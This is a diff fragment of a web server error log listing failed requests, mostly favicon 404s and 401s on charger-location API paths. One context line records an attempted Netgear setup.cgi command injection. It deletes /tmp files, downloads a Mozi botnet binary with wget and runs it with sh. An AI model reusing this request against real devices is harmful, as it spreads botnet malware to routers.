@@ -230,3 +230,5 @@
 2024-12-20T02:31:39.126Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
 2024-12-20T06:21:59.122Z [31merror[39m: [GET] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - 404 [1ms]
 2024-12-20T06:36:37.482Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
+2024-12-05T10:54:09.951Z [31merror[39m: [POST] /charger-locations/location/filter/site-survey - 401 [3ms]
+2024-12-05T10:54:45.360Z [31merror[39m: [GET] /charger-locations/type - 401 [2ms]
